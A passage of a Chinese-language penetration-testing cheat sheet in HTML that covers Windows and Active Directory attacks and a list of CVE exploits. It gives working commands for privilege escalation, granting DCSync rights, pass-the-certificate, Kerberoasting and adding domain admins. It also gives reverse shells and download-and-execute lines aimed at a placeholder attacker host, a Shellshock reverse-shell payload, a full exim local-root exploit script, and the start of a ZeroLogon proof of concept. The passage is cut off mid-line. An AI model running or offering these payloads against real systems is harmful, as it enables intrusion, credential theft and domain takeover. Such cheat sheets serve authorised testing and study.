<h5 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">schtasks<br>schtasks /query /tn &lt;TASK&gt; /fo <span class="hljs-built_in">list</span> /v<br>schtasks /run /tn &lt;TASK&gt;<br>Get-ScheduledTask | where &#123;$_.TaskPath -notlike <span class="hljs-string">&quot;\Microsoft*&quot;</span>&#125; | ft TaskName,TaskPath,State<br></code></pre></td></tr></table></figure>

<h5 id="未加引号的服务路径"><a href="#未加引号的服务路径" class="headerlink" title="未加引号的服务路径"></a>未加引号的服务路径</h5><p><code>Unquoted Service Paths</code>使用 进行搜索<code>sc qc</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">sc qc<br>sc qc &lt;SERVICE&gt;<br>sc stop &lt;SERVICE&gt;<br>sc start &lt;SERVICE&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">icacls &lt;PROGRAM&gt;.exe<br>icacls C:\PROGRA~<span class="hljs-number">2</span>\SYSTEM~<span class="hljs-number">1</span>\&lt;SERVICE&gt;.exe<br>icacls C:\PROGRA~<span class="hljs-number">2</span>\SYSTEM~<span class="hljs-number">1</span>\&lt;SERVICE&gt;.exe /grant Everyone:F<br></code></pre></td></tr></table></figure>

<h5 id="写DACL"><a href="#写DACL" class="headerlink" title="写DACL"></a>写DACL</h5><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/">https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">$SecPassword = ConvertTo-SecureString <span class="hljs-string">&#x27;&lt;PASSWORD&gt;&#x27;</span> -AsPlainText -Force<br>$Cred = New-Object System.Management.Automation.PSCredential(<span class="hljs-string">&#x27;&lt;DOMAIN&gt;\&lt;USERNAME&gt;&#x27;</span>, $SecPassword)<br>Add-ObjectACL -PrincipalIdentity &lt;USERNAME&gt; -Credential $Cred -Rights DCSync<br></code></pre></td></tr></table></figure>

<h5 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">wmic product get name,version,vendor<br>wmic qfe get Caption,Description,HotFixID,InstalledOn    <span class="hljs-meta"># no new patches - KEXP pretty likely</span><br></code></pre></td></tr></table></figure>

<h4 id="通过证书"><a href="#通过证书" class="headerlink" title="通过证书"></a>通过证书</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html">https://offsec.almond.consulting/authentication-with-certificates-when-pkinit-is-not-supported.html</a></p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/AlmondOffSec/PassTheCert/tree/main/Python">https://github.com/AlmondOffSec/PassTheCert/tree/main/Python</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">certipy-ad cert -pfx &lt;CERTIFICATE&gt;.pfx -nokey -out &lt;CERTIFICATE&gt;.crt<br>certipy-ad cert -pfx &lt;CERTIFICATE&gt;.pfx -nocert -out &lt;CERTIFICATE&gt;.key<br>python3 passthecert.py -domain <span class="hljs-string">&#x27;&lt;DOMAIN&gt;&#x27;</span> -dc-host <span class="hljs-string">&#x27;&lt;DOMAIN&gt;&#x27;</span> -action <span class="hljs-string">&#x27;modify_user&#x27;</span> -target <span class="hljs-string">&#x27;&lt;USERNAME&gt;&#x27;</span> -new-pass <span class="hljs-string">&#x27;&lt;PASSWORD&gt;&#x27;</span> -crt ./&lt;CERTIFICATE&gt;.crt -key ./&lt;CERTIFICATE&gt;.key<br>evil-winrm -i <span class="hljs-string">&#x27;&lt;RHOST&gt;&#x27;</span> -u <span class="hljs-string">&#x27;&lt;USERNAME&gt;&#x27;</span> -p <span class="hljs-string">&#x27;&lt;PASSWORD&gt;&#x27;</span><br></code></pre></td></tr></table></figure>

<h4 id="PKINIT工具"><a href="#PKINIT工具" class="headerlink" title="PKINIT工具"></a>PKINIT工具</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">python3 gettgtpkinit.py -cert-pfx &lt;USERNAME&gt;.pfx -dc-ip &lt;RHOST&gt; &lt;DOMAIN&gt;/&lt;USERNAME&gt; &lt;USERNAME&gt;.ccache<br>export KRB5CCNAME=&lt;USERNAME&gt;.ccache<br>python3 getnthash.py &lt;DOMAIN&gt;/&lt;USERNAME&gt; -key <span class="hljs-number">6617</span>cde50b7ee63faeb6790e84981c746efa66f68a1cc3a394bbd27dceaf0554<br></code></pre></td></tr></table></figure>

<h4 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">export ip=&lt;RHOST&gt;; <span class="hljs-keyword">for</span> port in $(seq <span class="hljs-number">1</span> <span class="hljs-number">65535</span>); <span class="hljs-keyword">do</span> timeout <span class="hljs-number">0.01</span> bash -c <span class="hljs-string">&quot;&lt;/dev/tcp/$ip/$port &amp;&amp; echo The port $port is open || echo The Port $port is closed &gt; /dev/null&quot;</span> <span class="hljs-number">2</span>&gt;/dev/null || echo Connection Timeout &gt; /dev/null; done<br></code></pre></td></tr></table></figure>

<h4 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">powershell -c <span class="hljs-string">&quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://&lt;LHOST&gt;/powercat.ps1&#x27;);powercat -c &lt;LHOST&gt; -p &lt;LPORT&gt; -e cmd&quot;</span><br></code></pre></td></tr></table></figure>

<h4 id="Powermad"><a href="#Powermad" class="headerlink" title="Powermad"></a>Powermad</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">Import-Module ./Powermad.ps1<br>$secureString = convertto-securestring <span class="hljs-string">&quot;&lt;PASSWORD&gt;&quot;</span> -asplaintext -force<br>New-MachineAccount -MachineAccount &lt;NAME&gt; -Domain &lt;DOMAIN&gt; -DomainController &lt;DOMAIN&gt; -Password $secureString<br></code></pre></td></tr></table></figure>

<h4 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h4><h5 id="常用命令-2"><a href="#常用命令-2" class="headerlink" title="常用命令"></a>常用命令</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">whoami /all<br>getuserid<br>systeminfo<br>Get-Process<br>net users<br>net users &lt;USERNAME&gt;<br>Get-ADUser -Filter * -SearchBase <span class="hljs-string">&quot;DC=&lt;DOMAIN&gt;,DC=LOCAL&quot;</span><br>Get-Content &lt;FILE&gt;<br>Get-ChildItem . -Force<br>GCI -hidden<br>type &lt;FILE&gt; | findstr /l &lt;STRING&gt;<br>[convert]::ToBase64String((Get-Content -path <span class="hljs-string">&quot;&lt;FILE&gt;&quot;</span> -Encoding byte))<br></code></pre></td></tr></table></figure>

<h5 id="允许脚本执行"><a href="#允许脚本执行" class="headerlink" title="允许脚本执行"></a>允许脚本执行</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">Set-ExecutionPolicy remotesigned<br>Set-ExecutionPolicy unrestricted<br></code></pre></td></tr></table></figure>

<h5 id="脚本执行绕过"><a href="#脚本执行绕过" class="headerlink" title="脚本执行绕过"></a>脚本执行绕过</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">powershell.exe -noprofile -executionpolicy bypass -file .\&lt;FILE&gt;.ps1<br></code></pre></td></tr></table></figure>

<h5 id="将模块导入到-PowerShell-cmdlet"><a href="#将模块导入到-PowerShell-cmdlet" class="headerlink" title="将模块导入到 PowerShell cmdlet"></a>将模块导入到 PowerShell cmdlet</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Import-Module .\&lt;FILE&gt;<br></code></pre></td></tr></table></figure>

<h5 id="检查-PowerShell-版本"><a href="#检查-PowerShell-版本" class="headerlink" title="检查 PowerShell 版本"></a>检查 PowerShell 版本</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">Set-ExecutionPolicy Unrestricted<br>powershell -Command <span class="hljs-string">&quot;$PSVersionTable.PSVersion&quot;</span><br>powershell -c <span class="hljs-string">&quot;[Environment]::Is64BitProcess&quot;</span><br></code></pre></td></tr></table></figure>

<h5 id="阅读-PowerShell-历史"><a href="#阅读-PowerShell-历史" class="headerlink" title="阅读 PowerShell 历史"></a>阅读 PowerShell 历史</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">type C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br></code></pre></td></tr></table></figure>

<h5 id="创建-zip-文件"><a href="#创建-zip-文件" class="headerlink" title="创建 .zip 文件"></a>创建 .zip 文件</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Compress-Archive -LiteralPath C:\PATH\TO\FOLDER\&lt;FOLDER&gt; -DestinationPath C:\PATH\TO\FILE&lt;FILE&gt;.zip<br></code></pre></td></tr></table></figure>

<h5 id="解压文件"><a href="#解压文件" class="headerlink" title="解压文件"></a>解压文件</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Expand-Archive -Force &lt;FILE&gt;.zip<br></code></pre></td></tr></table></figure>

<h5 id="开始一个新流程"><a href="#开始一个新流程" class="headerlink" title="开始一个新流程"></a>开始一个新流程</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Start-Process -FilePath <span class="hljs-string">&quot;C:\nc64.exe&quot;</span> -ArgumentList <span class="hljs-string">&quot;&lt;LHOST&gt; &lt;LPORT&gt; -e powershell&quot;</span><br></code></pre></td></tr></table></figure>

<h5 id="调用表达式-调用-WebRequest"><a href="#调用表达式-调用-WebRequest" class="headerlink" title="调用表达式 &#x2F; 调用 WebRequest"></a>调用表达式 &#x2F; 调用 WebRequest</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">IEX(IWR http:<span class="hljs-comment">//&lt;LHOST&gt;/&lt;FILE&gt;.ps1)</span><br>Invoke-Expression (Invoke-WebRequest http:<span class="hljs-comment">//&lt;LHOST/&lt;FILE&gt;.ps1)</span><br></code></pre></td></tr></table></figure>

<h5 id="NET-反射"><a href="#NET-反射" class="headerlink" title=".NET 反射"></a>.NET 反射</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">$bytes = (Invoke-WebRequest <span class="hljs-string">&quot;http://&lt;LHOST&gt;/&lt;FILE&gt;.exe&quot;</span> -UseBasicParsing ).Content<br>$assembly = [System.Reflection.Assembly]::Load($bytes)<br>$entryPointMethod = $assembly.GetTypes().Where(&#123; $_.Name -eq <span class="hljs-string">&#x27;Program&#x27;</span> &#125;, <span class="hljs-string">&#x27;First&#x27;</span>).GetMethod(<span class="hljs-string">&#x27;Main&#x27;</span>, [Reflection.BindingFlags] <span class="hljs-string">&#x27;Static, Public, NonPublic&#x27;</span>)<br>$entryPointMethod.Invoke($null, (, [<span class="hljs-built_in">string</span>[]] (<span class="hljs-string">&#x27;find&#x27;</span>, <span class="hljs-string">&#x27;/&lt;COMMAND&gt;&#x27;</span>)))<br></code></pre></td></tr></table></figure>

<h5 id="启动offsec会话"><a href="#启动offsec会话" class="headerlink" title="启动offsec会话"></a>启动offsec会话</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">$offsec_session = New-PSSession -ComputerName &lt;RHOST&gt; -Authentication Negotiate -Credential &lt;USERNAME&gt;<br>Enter-PSSession $offsec_session<br></code></pre></td></tr></table></figure>

<h5 id="以另一个用户身份执行命令"><a href="#以另一个用户身份执行命令" class="headerlink" title="以另一个用户身份执行命令"></a>以另一个用户身份执行命令</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">$SecurePassword = ConvertTo-SecureString <span class="hljs-string">&#x27;&lt;PASSWORD&gt;&#x27;</span> -AsPlainText -Force<br>$Cred = New-Object System.Management.Automation.PSCredential(<span class="hljs-string">&#x27;&lt;USERNAME&gt;&#x27;</span>, $SecurePassword)<br>$Session = New-PSSession -Credential $Cred<br>Invoke-Command -Session $session -scriptblock &#123; whoami &#125;<br></code></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">$username = <span class="hljs-string">&#x27;&lt;USERNAME&gt;&#x27;</span><br>$password = <span class="hljs-string">&#x27;&lt;PASSWORD&gt;&#x27;</span><br>$securePassword = ConvertTo-SecureString $password -AsPlainText -Force<br>$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword<br>Start-Process powershell.exe -Credential $credential<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">powershell -c <span class="hljs-string">&quot;$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *&quot;</span><br></code></pre></td></tr></table></figure>

<h5 id="添加新的域管理员"><a href="#添加新的域管理员" class="headerlink" title="添加新的域管理员"></a>添加新的域管理员</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">$PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String &lt;PASSWORD&gt;<br>New-ADUser -Name <span class="hljs-string">&quot;&lt;USERNAME&gt;&quot;</span> -Description <span class="hljs-string">&quot;&lt;DESCRIPTION&gt;&quot;</span> -Enabled $<span class="hljs-literal">true</span> -AccountPassword $PASSWORD<br>Add-ADGroupMember -Identity <span class="hljs-string">&quot;Domain Admins&quot;</span> -Member &lt;USERNAME&gt;<br></code></pre></td></tr></table></figure>

<h5 id="在用户上下文中执行命令"><a href="#在用户上下文中执行命令" class="headerlink" title="在用户上下文中执行命令"></a>在用户上下文中执行命令</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">$pass = ConvertTo-SecureString <span class="hljs-string">&quot;&lt;PASSWORD&gt;&quot;</span> -AsPlaintext -Force<br>$cred = New-Object System.Management.Automation.PSCredential (<span class="hljs-string">&quot;&lt;DOMAIN&gt;\&lt;USERNAME&gt;&quot;</span>, $pass)<br>Invoke-Command -computername &lt;COMPUTERNAME&gt; -ConfigurationName dc_manage -credential $cred -command &#123;whoami&#125;<br></code></pre></td></tr></table></figure>

<h5 id="使用凭据执行脚本（反向-Shell）"><a href="#使用凭据执行脚本（反向-Shell）" class="headerlink" title="使用凭据执行脚本（反向 Shell）"></a>使用凭据执行脚本（反向 Shell）</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">$pass = ConvertTo-SecureString <span class="hljs-string">&quot;&lt;PASSWORD&gt;&quot;</span> -AsPlainText -Force<br>$cred = New-Object System.Management.Automation.PSCredential(<span class="hljs-string">&quot;&lt;DOMAIN&gt;\&lt;USERNAME&gt;&quot;</span>, $pass)<br>Invoke-Command -Computer &lt;RHOST&gt; -ScriptBlock &#123; IEX(New-Object Net.WebClient).downloadString(<span class="hljs-string">&#x27;http://&lt;LHOST&gt;/&lt;FILE&gt;.ps1&#x27;</span>) &#125; -Credential $cred<br></code></pre></td></tr></table></figure>

<h4 id="pwncat"><a href="#pwncat" class="headerlink" title="pwncat"></a>pwncat</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">(local) pwncat$ back    <span class="hljs-comment">// get back to shell</span><br>Ctrl+d                  <span class="hljs-comment">// get back to pwncat shell</span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">pwncat-cs -lp &lt;LPORT&gt;<br>(local) pwncat$ download /PATH/TO/FILE/&lt;FILE&gt; .<br>(local) pwncat$ upload /PATH/TO/FILE/&lt;FILE&gt; /PATH/TO/FILE/&lt;FILE&gt;<br></code></pre></td></tr></table></figure>

<h4 id="RPCLIENT"><a href="#RPCLIENT" class="headerlink" title="RPCLIENT"></a>RPCLIENT</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">rpcclient -U <span class="hljs-string">&quot;&quot;</span> &lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">dsr_getdcname<br>dsr_getdcnameex<br>dsr_getdcnameex2<br>dsr_getsitename<br>enumdata<br>enumdomgroups<br>enumdomusers<br>enumjobs<br>enumports<br>enumprivs<br>getanydcname<br>getdcname<br>lookupsids<br>lsaenumsid &lt;SID&gt;<br>lsaquery<br>netconnenum<br>netdiskenum<br>netfileenum<br>netsessenum<br>netshareenum<br>netshareenumall<br>netsharegetinfo<br>queryuser &lt;USERNAME&gt;<br>srvinfo<br></code></pre></td></tr></table></figure>

<h4 id="Rubeus-exe"><a href="#Rubeus-exe" class="headerlink" title="Rubeus.exe"></a>Rubeus.exe</h4><h5 id="获取服务主体哈希值"><a href="#获取服务主体哈希值" class="headerlink" title="获取服务主体哈希值"></a>获取服务主体哈希值</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\Rubeus.exe kerberoast /user:&lt;USERNAME&gt;<br></code></pre></td></tr></table></figure>

<h5 id="哈希传递"><a href="#哈希传递" class="headerlink" title="哈希传递"></a>哈希传递</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\Rubeus.exe asktgt /user:Administrator /certificate:<span class="hljs-number">7F</span>052EB0D5D122CEF162FAE8233D6A0ED73ADA2E /getcredentials<br></code></pre></td></tr></table></figure>

<h4 id="RunasCs-exe"><a href="#RunasCs-exe" class="headerlink" title="RunasCs.exe"></a>RunasCs.exe</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">.\RunasCs.exe &lt;USERNAME&gt; &lt;PASSWORD&gt; cmd.exe -r &lt;LHOST&gt;:&lt;LPORT&gt;<br>.\RunasCs.exe &lt;USERNAME&gt; &lt;PASSWORD&gt; cmd.exe -r &lt;LHOST&gt;:&lt;LPORT&gt; --bypass-uac<br>.\RunasCs.exe -d &lt;DOMAIN&gt; <span class="hljs-string">&quot;&lt;USERNAME&gt;&quot;</span> <span class="hljs-string">&#x27;&lt;PASSWORD&gt;&#x27;</span> cmd.exe -r &lt;LHOST&gt;:&lt;LPORT&gt;<br>.\RunasCs.exe -l <span class="hljs-number">3</span> -d &lt;DOMAIN&gt; <span class="hljs-string">&quot;&lt;USERNAME&gt;&quot;</span> <span class="hljs-string">&#x27;&lt;PASSWORD&gt;&#x27;</span> <span class="hljs-string">&#x27;C:\Users\&lt;USERNAME&gt;\Downloads\&lt;FILE&gt;.exe&#x27;</span><br></code></pre></td></tr></table></figure>

<h4 id="smbpasswd"><a href="#smbpasswd" class="headerlink" title="smbpasswd"></a>smbpasswd</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">smbpasswd -U &lt;RHOST&gt;\&lt;USERNAME&gt; -r &lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

<h4 id="winexe"><a href="#winexe" class="headerlink" title="winexe"></a>winexe</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">winexe -U <span class="hljs-string">&#x27;&lt;USERNAME%PASSWORD&gt;&#x27;</span> <span class="hljs-comment">//&lt;RHOST&gt; cmd.exe</span><br>winexe -U <span class="hljs-string">&#x27;&lt;USERNAME%PASSWORD&gt;&#x27;</span> --system <span class="hljs-comment">//&lt;RHOST&gt; cmd.exe</span><br></code></pre></td></tr></table></figure>

<h3 id="CVE-漏洞集合汇总"><a href="#CVE-漏洞集合汇总" class="headerlink" title="CVE 漏洞集合汇总"></a>CVE 漏洞集合汇总</h3><h4 id="CVE-2014-6271：Shellshock-RCE-PoC"><a href="#CVE-2014-6271：Shellshock-RCE-PoC" class="headerlink" title="CVE-2014-6271：Shellshock RCE PoC"></a>CVE-2014-6271：Shellshock RCE PoC</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">curl -H <span class="hljs-string">&#x27;Cookie: () &#123; :;&#125;; /bin/bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&#x27;</span> http:<span class="hljs-comment">//&lt;RHOST&gt;/cgi-bin/user.sh</span><br></code></pre></td></tr></table></figure>

<h4 id="CVE-2016-1531：exim-LPE"><a href="#CVE-2016-1531：exim-LPE" class="headerlink" title="CVE-2016-1531：exim LPE"></a>CVE-2016-1531：exim LPE</h4><ul>
<li>exim 版本 &lt;&#x3D; 4.84-3<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">#!/bin/sh<br># CVE<span class="hljs-number">-2016</span><span class="hljs-number">-1531</span> exim &lt;= <span class="hljs-number">4.84</span><span class="hljs-number">-3</span> local root exploit<br># ===============================================<br><span class="hljs-meta"># you can write files as root or force a perl module to</span><br><span class="hljs-meta"># load by manipulating the perl environment and running</span><br><span class="hljs-meta"># exim with the <span class="hljs-string">&quot;perl_startup&quot;</span> arguement -ps. </span><br>#<br><span class="hljs-meta"># e.g.</span><br># [fantastic@localhost tmp]$ ./cve<span class="hljs-number">-2016</span><span class="hljs-number">-1531.</span>sh <br># [ CVE<span class="hljs-number">-2016</span><span class="hljs-number">-1531</span> local root exploit<br><span class="hljs-meta"># sh-4.3# id</span><br><span class="hljs-meta"># uid=0(root) gid=1000(fantastic) groups=1000(fantastic)</span><br># <br># -- Hacker Fantastic <br>echo [ CVE<span class="hljs-number">-2016</span><span class="hljs-number">-1531</span> local root exploit<br>cat &gt; /tmp/root.pm &lt;&lt; EOF<br>package root;<br>use strict;<br>use warnings;<br><br>system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>EOF<br>PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps<br></code></pre></td></tr></table></figure></li>
</ul>
<h4 id="CVE-2019-14287：Sudo-绕过"><a href="#CVE-2019-14287：Sudo-绕过" class="headerlink" title="CVE-2019-14287：Sudo 绕过"></a>CVE-2019-14287：Sudo 绕过</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47502">https://www.exploit-db.com/exploits/47502</a></p>
</blockquote>
<h5 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h5><ul>
<li>须藤版本 &lt; 1.8.28</li>
</ul>
<h5 id="开发"><a href="#开发" class="headerlink" title="开发"></a>开发</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">!root:<br>sudo -u#<span class="hljs-number">-1</span> /bin/bash<br></code></pre></td></tr></table></figure>

<h4 id="CVE-2020-1472：ZeroLogon-PE"><a href="#CVE-2020-1472：ZeroLogon-PE" class="headerlink" title="CVE-2020-1472：ZeroLogon PE"></a>CVE-2020-1472：ZeroLogon PE</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py">https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py</a></p>
</blockquote>
<h5 id="先决条件-1"><a href="#先决条件-1" class="headerlink" title="先决条件"></a>先决条件</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">python3 -m pip install virtualenv<br>python3 -m virtualenv venv<br>source venv/bin/activate<br>pip install git+https:<span class="hljs-comment">//github.com/SecureAuthCorp/impacket</span><br></code></pre></td></tr></table></figure>

<h5 id="概念验证修改"><a href="#概念验证修改" class="headerlink" title="概念验证修改"></a>概念验证修改</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">newPassRequest = nrpc.NetrServerPasswordSet2()<br>newPassRequest[<span class="hljs-string">&#x27;PrimaryName&#x27;</span>] = dc_handle + <span class="hljs-string">&#x27;\x00&#x27;</span><br>newPassRequest[<span class="hljs-string">&#x27;AccountName&#x27;</span>] = target_computer + <span class="hljs-string">&#x27;$\x00&#x27;</span><br>newPassRequest[<span class="hljs-string">&#x27;SecureChannelType&#x27;</span>] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel<br>auth = nrpc.NETLOGON_AUTHENTICATOR()<br>auth[<span class="hljs-string">&#x27;Credential&#x27;</span>] = b<span class="hljs-number">&#x27;</span>\x00<span class="hljs-number">&#x27;</span> * <span class="hljs-number">8</span><br>auth[<span class="hljs-string">&#x27;Timestamp&#x27;</span>] = <span class="hljs-number">0</span><br>newPassRequest[<span class="hljs-string">&#x27;Authenticator&#x27;</span>] = auth<br>newPassRequest[<span class="hljs-string">&#x27;ComputerName&#x27;</span>] = target_computer + <span class="hljs-string">&#x27;\x00&#x27;</span><br>newPassRequest[<span class="hljs-string">&#x27;ClearNewPassword&#x27;</span>] =  b<span class="hljs-number">&#x27;</span>\x00<span class="hljs-number">&#x27;</span> * <span 